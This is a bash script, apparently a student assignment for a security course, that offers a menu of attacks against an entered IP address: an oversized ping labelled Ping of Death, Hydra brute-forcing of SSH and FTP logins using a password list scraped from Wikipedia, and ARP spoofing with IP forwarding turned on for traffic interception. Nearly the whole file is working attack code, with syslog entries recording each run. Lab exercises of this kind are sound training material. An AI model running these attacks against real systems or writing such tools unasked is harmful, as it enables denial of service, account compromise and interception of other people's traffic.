#!/bin/bash
#Ahmad Shafie S11 CFC3110 James Lim


echo "Please enter the IP address you wish to attack."
read ipAddr

function option_one() 
{
  echo "You selected Ping Of Death"
  logger -p local0.notice "Attack type: ping of death, Time of execution: $(date), Target IP address: $ipAddr"
  ping -s 65528 $ipAddr
 
}

function option_two() 
{
  echo "You selected Hydra"
  echo ""
  if [ $(dpkg-query -l | grep '^ii' | awk '{print $2}' | grep hydra | head -n 1) == "hydra" ];
	then
	
	echo "hydra is already installed "
	
	else
	
	echo "Installing hydra."
  sudo apt-get install hydra
  fi
  
  echo "Do you have the password you wish to attack? 1) Yes 2) No(Password will be generated through Wikipedia's 10,000 most common passwords"
  read password
  case $password in
  1)
    echo "Please input password"
    read pwD
      echo "Please input the user you wish to attack"
  read useR
  hydra -l $useR -p $pwD $ipAddr ssh -vV -o hydra.log
  logger -p local0.notice "Attack type: Hydra FTP Brute Force, Time of execution: $(date), Target IP address: $ipAddr"
    ;;
  2)
  wget https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords
  cat Wikipedia:10,000_most_common_passwords | grep "<li>" | grep "</li>" | grep -v href | awk -F">" '{print $2}' | awk -F"<" '{print $1}' > wikipw.txt
  echo "Please input the user you wish to attack"
  read useR
  hydra -l $useR -P wikipw.txt $ipAddr ftp -vV -o hydra.log
  logger -p local0.notice "Attack type: Hydra FTP Brute Force, Time of execution: $(date), Target IP address: $ipAddr"
    ;;
    esac
}

function option_three() 
{
  echo "You selected Arpspoof"
  if [ $(dpkg-query -l | grep '^ii' | awk '{print $2}' | grep dsniff) == "dsniff" ];
	then
	
	echo "dsniff is already installed "
	
	else
	
	echo "Installing dsniff."
	
  sudo apt-get install dsniff
	fi
	
	if [ $(whoami) == "root" ];
	then
	
	echo "Please input the Default Gateway you wish to attack"
	read Defgat
		echo 1 > /proc/sys/net/ipv4/ip_forward
		logger -p local0.notice "Attack type: arpspoof, Time of execution: $(date), Target IP address: $ipAddr"
  arpspoof -t $Defgat -r $ipAddr
  
	else
	
	echo "Sorry, you are not running the program as root user. Switching to root user and copying file to a root user directory. Please try again."
	sudo cp soc.sh /root
	sudo -i
	exit
	
	fi
}

# Display menu and read user input
echo "Please select an option:"
echo "1. Ping Of Death(Ping of Death (a.k.a. PoD) is a type of Denial of Service (DoS) attack in which an attacker attempts to crash, destabilize, or freeze the targeted computer or service by sending malformed or oversized packets using a simple ping command.)"
echo "2. Hydra(Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.)"
echo "3. Arpspoof(Arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.)"
echo "4. Random"
read choice

# Execute function based on user input
case $choice in
  1)
    option_one
    ;;
  2)
    option_two
    ;;
  3)
    option_three
    ;;
  4)
    random_choice=$((1 + RANDOM % 3))
    case $random_choice in
      1)
        echo "Your Random choice is Ping Of Death"
        option_one
        ;;
      2)
        echo "Your Random choice is Hydra"
        option_two
        ;;
      3)
        echo "Your Random choice is Arpspoof "
        option_three
        ;;
    esac
    ;;
  *)
    echo "Invalid option."
    exit
    ;;
esac
